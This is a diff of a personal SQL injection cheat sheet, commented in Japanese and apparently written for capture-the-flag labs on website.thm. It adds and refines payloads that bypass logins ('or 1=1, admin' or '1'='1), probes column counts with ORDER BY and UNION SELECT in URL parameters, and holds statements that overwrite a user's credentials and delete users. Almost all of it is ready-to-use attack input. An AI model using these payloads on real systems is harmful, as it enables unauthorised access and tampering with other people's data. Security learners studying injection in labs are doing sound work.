@@ -15,11 +15,14 @@ update users SET username='root',password='pass123' where username='admin';
 delete from users where username='martin';
 
 //ログインのバイパス
-'or 1=1;-- -
+'or 1=1;-- - #ユーザ名不明なときユーザ名、パスの両方をバイパス
+admin' or '1'='1 #ユーザ名adminがわかっているときパスのみバイパス
+'or '1'='1 #後ろをコメントアウトしないとき
+
 
 //カラム数の探知
 ' order by 1;-- - #数字を１ずつ増やす
-1 union select 1;-- - #1,2,3みたいに数字を増やしていく
+1' union select 1;-- - #1,2,3みたいに数字を増やしていく
 https://website.thm/article?id=0 union select 1,2,3;-- - #URLにもできる
 https://website.thm/checkuser?username=admin' order by 4;-- - #order byもできる
 
